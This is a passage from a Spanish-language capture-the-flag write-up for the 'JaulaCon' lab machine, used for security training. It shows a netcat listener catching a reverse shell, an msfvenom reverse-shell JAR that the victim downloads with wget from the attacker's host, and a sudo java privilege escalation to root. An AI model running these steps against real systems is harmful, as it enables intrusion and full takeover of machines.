listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
17:37:57.598873 IP 192.168.1.200 > Tu_IP: ICMP echo request, id 46817, seq 1, length 64
17:37:57.598891 IP Tu_IP > 192.168.1.200: ICMP echo reply, id 46817, seq 1, length 64
17:37:58.600897 IP 192.168.1.200 > Tu_IP: ICMP echo request, id 46817, seq 2, length 64
17:37:58.600911 IP Tu_IP > 192.168.1.200: ICMP echo reply, id 46817, seq 2, length 64
```
Funciono y ya con esto podemos probar a lanzar una **Reverse Shell**.

Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Configura la **Reverse Shell** en el payload y envía la petición:

<p align="center">
<img src="/assets/images/THL-writeup-jaulaCon/Captura15.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.200] 54800
bash: no se puede establecer el grupo de proceso de terminal (346): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
jaula@JaulaCon:/var/www/html/PrototypePollution-Lab/prototypePoluttion$ whoami
<l/PrototypePollution-Lab/prototypePoluttion$ whoami                    
jaula
```
Estamos dentro.

Obten una sesión interactiva y busca la flag del usuario:
```bash
jaula@JaulaCon:/var/www/html/PrototypePollution-Lab$ ls /home
jaula
jaula@JaulaCon:/var/www/html/PrototypePollution-Lab$ cd /home/jaula/
jaula@JaulaCon:~$ ls -la
total 40
drwxr-xr-x 4 jaula jaula 4096 jun  1  2024 .
drwxr-xr-x 3 root  root  4096 jun  1  2024 ..
-rw------- 1 jaula jaula  311 jun  1  2024 .bash_history
-rw-r--r-- 1 jaula jaula  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 jaula jaula 3526 abr 23  2023 .bashrc
drwxr-xr-x 3 jaula jaula 4096 jun  1  2024 .local
drwxr-xr-x 3 jaula jaula 4096 jun  1  2024 .npm
-rw-r--r-- 1 jaula jaula  807 abr 23  2023 .profile
-rw-r--r-- 1 jaula jaula   66 jun  1  2024 .selected_editor
-rw-r--r-- 1 jaula jaula   33 jun  1  2024 user.txt
jaula@JaulaCon:~$ cat user.txt
...
```

**Nota**:

Si revisamos el script **routes.js**, podremos ver que está ocupando la función `exec()`:
```bash
jaula@JaulaCon:/var/www/html/PrototypePollution-Lab/prototypePoluttion$ cat routes.js
<typePollution-Lab/prototypePoluttion$ cat routes.js                    
const express = require("express");
const routes = express.Router();
const crypto = require("crypto");
const { exec } = require("child_process");
const extend = require("node.extend");
...
```

## Post Explotación {#Post}

### Escalando Privilegios Descomprimiendo Archivo JAR que Guarda Reverse Shell {#Java}

Si revisamos los privilegios de nuestro usuario, encontraremos que podemos usar el binario java como **Root**:
```bash
jaula@JaulaCon:~$ sudo -l
Matching Defaults entries for jaula on JaulaCon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jaula may run the following commands on JaulaCon:
    (root) NOPASSWD: /usr/bin/java
```
Quizá podemos utilizar la misma forma en la que obtenemos una **Reverse Shell** cuando ganamos acceso al login de **Apache Tomcat**.

Aquí dejo un blog que lo explica:
<a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/" target="_blank">Sudo Java Privilege Escalation</a>

Vamos a crear la **Reverse Shell** con **msfvenom**:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=Tu_IP LPORT=1337 -f jar -o shell.jar
Payload size: 7506 bytes
Final size of jar file: 7506 bytes
Saved as: shell.jar
```

Como en la máquina víctima tenemos **wget**, podemos levantar un servidor de **Python** en donde tengamos el **archivo JAR** y descargarlo:
```bash
jaula@JaulaCon:~$ wget http://Tu_IP/shell.jar
--2025-03-27 01:11:38--  http://Tu_IP/shell.jar
Conectando con Tu_IP:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 7506 (7,3K) [application/java-archive]
Grabando a: «shell.jar»
.
shell.jar  100%[===========================>]   7,33K  --.-KB/s    en 0s
```

Abre una **netcat**:
```bash
nc -nlvp 1337
listening on [any] 1337 ...
```

Y lo descomprimimos con el **binario java**:
```bash
jaula@JaulaCon:~$ sudo /usr/bin/java -jar shell.jar
```

Observa la **netcat**:
```bash
nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.200] 37278
whoami
root
/bin/bash -i
root@JaulaCon:/home/jaula# whoami
whoami
root
```

Ya solo buscamos la última flag:
```bash
root@JaulaCon:~# ls
ls
root.txt
root@JaulaCon:~# cat root.txt           
cat root.txt
...
```
Y con esto terminamos la máquina.
